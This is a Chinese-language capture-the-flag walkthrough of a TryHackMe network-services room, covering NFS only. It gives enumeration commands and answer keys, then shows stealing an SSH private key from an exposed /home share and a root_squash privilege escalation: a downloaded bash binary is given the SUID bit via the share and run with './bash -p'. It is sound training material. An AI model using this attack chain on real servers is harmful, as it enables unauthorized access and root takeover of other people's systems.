# Newwork Services 2

**🌐 網路服務 2**

THM路徑：https://tryhackme.com/room/networkservices2

---

>> #### Task 1：建立聯繫

>> #### Task 2：瞭解 NFS

**NFS（Network File System）**：
- 一種可以**跨網路共享檔案或資料夾**的協定
- 你可以把遠端資料夾 **掛載（mount）在自己電腦上使用**，像自己硬碟一樣
- 主用 **RPC（Remote Procedure Call）** 進行資料操作


- 哪些系統支援 NFS：
  - Linux 🐧
  - macOS 🍎
  - UNIX ☀️
  - Windows Server（透過 NFS 服務）🪟


<details>
<summary><strong>運作方式：</strong></summary>

1. 用戶端（Client）發出 mount 請求
2. 伺服器判斷用戶是否有權限
3. 如果有權限 → 回傳「file handle」讓 client 能使用那個資料夾
4. Client 就可以像在本地一樣瀏覽與編輯那些檔案（依權限）
---

當使用者透過 NFS（Network File System）要存取檔案時，會由客戶端對伺服器上的 NFSD（NFS 守護程序） 發出一個 RPC 呼叫（遠端程序呼叫）。這個呼叫會夾帶以下參數：

| 參數              | 說明                                             |
|-------------------|--------------------------------------------------|
| File Handle       | 用來識別檔案的唯一代碼（非路徑）                 |
| File Name         | 要存取的檔案名稱                                 |
| User ID (UID)     | 請求存取檔案的使用者 ID（數字）                   |
| Group ID (GID)    | 該使用者所屬的群組 ID（數字）                     |

</details>

---
<details>
<summary><strong>NFS 的安全性問題</strong></summary>

| 漏洞點類型         | 說明 |
|:------------------|:----|
| 匿名掛載          | 某些 NFS 分享沒有做權限限制，任何人都能掛載 |
| root_squash 關閉  | 客戶端掛載後就能以 root 權限操作檔案，爆炸危險 💣 |
| 傳統明文協定      | 沒有加密，可能被攔截封包或篡改 |
| 可寫入敏感資料     | 可種 backdoor / 上傳 SSH key 等 |

</details>

##### 🔐 答題：
1. What does NFS stand for?
   
   NFS 代表什麼？
   
&nbsp;&nbsp;&nbsp;&nbsp; `Network File System`

2. What process allows an NFS client to interact with a remote directory as though it was a physical device?
   
   什麼進程允許 NFS 用戶端與遠端目錄交互，就像它是物理設備一樣？
   
&nbsp;&nbsp;&nbsp;&nbsp; `Mounting`

3. What does NFS use to represent files and directories on the server?
   
   NFS 使用什麼來表示伺服器上的文件和目錄？
   
&nbsp;&nbsp;&nbsp;&nbsp; `file handle`

4. What protocol does NFS use to communicate between the server and client?
   
   NFS 使用什麼協定在伺服器和客戶端之間進行通信？
   
&nbsp;&nbsp;&nbsp;&nbsp; `RPC`

5. What two pieces of user data does the NFS server take as parameters for controlling user permissions? Format: parameter 1 / parameter 2
   
   NFS 伺服器將哪兩條用戶數據作為控制使用者許可權的參數？格式：參數 1 / 參數 2
   
&nbsp;&nbsp;&nbsp;&nbsp; `user id / group id`

6. Can a Windows NFS server share files with a Linux client? (Y/N)
   
   Windows NFS 伺服器是否可以與 Linux 用戶端共享檔？（是/否）
   
&nbsp;&nbsp;&nbsp;&nbsp; `Y`

7. Can a Linux NFS server share files with a MacOS client? (Y/N)
   
   Linux NFS 伺服器可以與 MacOS 用戶端共享檔嗎？（是/否）
   
&nbsp;&nbsp;&nbsp;&nbsp; `Y`

8. What is the latest version of NFS? [released in 2016, but is still up to date as of 2020] This will require external research.
   
   NFS 的最新版本是什麼？[2016 年發布，但截至 2020 年仍是最新的]這將需要外部研究。
   
&nbsp;&nbsp;&nbsp;&nbsp; `4.2`

>> #### Task 3：枚舉 NFS

🛠️ 工具需求：nfs-common
- 對象：需要掛載 NFS 的客戶端／伺服器。
- 包含指令：showmount、mount.nfs（本次重點）。

---

📂 掛載 NFS Share
1. 建立本地目錄作為掛載點，例如： 
`mkdir /tmp/mount/`
2. 掛載指令格式：`sudo mount -t nfs [IP]:[share名] /tmp/mount/ -nolock`

<details>
<summary><strong>參數說明：</strong></summary>

| 參數       | 說明                            |
|------------|---------------------------------|
| `sudo`     | 以 root 權限執行                |
| `mount`    | 掛載指令                        |
| `-t nfs`   | 指定掛載類型為 NFS              |
| `IP:share` | NFS 伺服器的 IP 和分享目錄名稱 |
| `-nolock`  | 不使用 NLM 鎖定（避免錯誤）     |

</details>

Question 1、2：對靶機執行`nmap`掃描

- 找到 7 個 Port
- nfs 服務對應端口為 2049

<p align="left">
  <img src="/rooms/images/12_01.png" width="600">
</p>

<p align="left">
  <img src="/rooms/images/12_02.png" width="600">
</p>

Question 3：用`showmount`，列出靶機的NFS共享

- NFS共享名稱為：/home

<p align="left">
  <img src="/rooms/images/12_03.png" width="600">
</p>

Question 4 - 7：於虛擬機上創建一個掛載點，使用`mount`掛載遠程主機的 NFS，再查看 NFS 共享內容

- NFS共享中的文件夾名稱為：cappucino 
- 保存SSH密鑰文件的文件夾是：.ssh文件夾
- 最有用的SSH密鑰文件是：id_rsa （ssh私鑰文件）

```
mkdir /tmp/mount
mount -t nfs <IP>:home /tmp/mount/ -nolock
cd /tmp/mount
ls
cd cappucino
ls -a
cd .ssh
ls
```

<p align="left">
  <img src="/rooms/images/12_04.png" width="600">
</p>

Question 8：複製公鑰、私鑰到虛擬機上，讀取公鑰檔案，並變更私鑰權限。<br>
以 ssh 私鑰登入 nfs 服務

```
cp id_rsa* ~/.ssh
cd ~/.ssh
ls -a
cat id_rsa.pub
chmod 600 id_rsa
ssh -i id_rsa cappucino@10.10.20.187
```
<p align="left">
  <img src="/rooms/images/12_05.png" width="600">
</p>

<p align="left">
  <img src="/rooms/images/12_06.png" width="600">
</p>

##### 🔐 答題：
1. How many ports are open on the target machine?
   
   目標計算機上打開了多少個埠？
   
&nbsp;&nbsp;&nbsp;&nbsp; `7`

2. Which port contains the service we're looking to enumerate?
   
   哪個埠包含我們要列舉的服務？
   
&nbsp;&nbsp;&nbsp;&nbsp; `2049`

3. Now, use /usr/sbin/showmount -e [IP] to list the NFS shares, what is the name of the visible share?
   
   現在，使用 /usr/sbin/showmount -e [IP] 列出 NFS 共用，可見共用的名稱是什麼？
   
&nbsp;&nbsp;&nbsp;&nbsp; `/home`

4. Then, use the mount command we broke down earlier to mount the NFS share to your local machine. Change directory to where you mounted the share- what is the name of the folder inside?
   
   然後，使用我們之前分解的 mount 命令將 NFS 共用掛載到您的本地電腦。將目錄更改為掛載共用的位置 - 其中的資料夾名稱是什麼？
   
&nbsp;&nbsp;&nbsp;&nbsp; `cappucino`

6. Interesting! Let's do a bit of research now, have a look through the folders. Which of these folders could contain keys that would give us remote access to the server?
   
   有趣！現在讓我們做一些研究，看看這些資料夾。這些摺疊者中的哪些可以控制密鑰 ，使我們能夠遠端訪問伺服器？
   
&nbsp;&nbsp;&nbsp;&nbsp; `.ssh`

7. Which of these keys is most useful to us?
   
   這些鑰中哪一個對我們最有用？
   
&nbsp;&nbsp;&nbsp;&nbsp; `id_rsa`

8. Can we log into the machine using ssh -i <key-file> <username>@<ip> ? (Y/N)
   
   我們可以使用 ssh -i <key-file> <username>@<ip> 登錄計算機嗎？（是/否）
   
&nbsp;&nbsp;&nbsp;&nbsp; `Y`

>> #### Task 4：利用 NFS

**NFS 提權**

- Root Squash 是什麼？
    - Root Squash：NFS 預設開啟，防止遠端使用者以 root 權限操作。
    - 被套用 Root Squash 時，遠端 root 使用者會被降為 nfsnobody 低權限帳號。<br>

✅ **如果 Root Squash 關閉** ➔ 可以利用上傳檔案設置 SUID 位元進行提權！

---

- SUID 是什麼？
  - SUID (Set User ID)：讓執行檔以檔案擁有者的**權限執行**。
  - 如果 SUID 設在 root 擁有的檔案上，普通用戶執行時可直接取得 root 權限。

---

- 📌      攻擊流程（提權步驟）
1. 取得 低權限 shell。
2. 上傳自己的 bash 可執行檔到 NFS 分享目錄。
3. 設定該 bash 檔案的 SUID 權限。
4. 通過 SSH 登入目標機器。
5. 執行剛剛上傳的 SUID bash ➔ 取得 root 權限！

✅ Bash 可執行檔來源
- 指令範例（用 SCP 抓 bash）：<br>
`scp -i [私鑰檔] [使用者名稱]@[目標IP]:/bin/bash ~/Downloads/bash`
- 或從網路下載相容版本的 Ubuntu bash（需注意不要下載錯誤版本）。

---

Question 3、4：從 Github 下載 bash 到虛擬機（如為免費AttackBox，無法下載）
`wget https://github.com/polo-sec/writing/raw/master/Security%20Challenge%20Walkthroughs/Networks%202/bash`

<p align="left">
  <img src="/rooms/images/12_07.png" width="600">
</p>

```
ls -a
chown root bash
chmod +x bash
cp bash /tmp/mount/cappucino/
chmod +s /tmp/mount/cappucino/bash
ssh -i id_rsa cappucino@10.10.20.187
```

下載完成後：

- `ls -a` <br>列出目前目錄所有檔案（確認 bash 是否存在）


- `chown root bash` <br>將 bash 的擁有者改為 root（讓 SUID 能以 root 身份執行）


- `chmod +x bash` <br>賦予執行權限


- `cp bash /tmp/mount/cappucino/`<br>將 bash 複製到 NFS 掛載目錄（目標機可存取）


- `chmod +s /tmp/mount/cappucino/bash` <br>開啟 SUID bit，讓任何人執行時以 root 身份執行


- `ssh -i id_rsa cappucino@1<IP>` <br>以 SSH 登入目標機器（低權限帳號）

<p align="left">
  <img src="/rooms/images/12_08.png" width="600">
</p>

```
ls -la
./bash -p
```

<p align="left">
  <img src="/rooms/images/12_09.png" width="600">
</p>

>> #### Task 5：瞭解 SMTP

>> #### Task 6：枚舉 SMTP

>> #### Task 7：利用 SMTP

>> #### Task 8：瞭解 MySQL

>> #### Task 9：利用 MySQL 

>> #### Task 10：結論
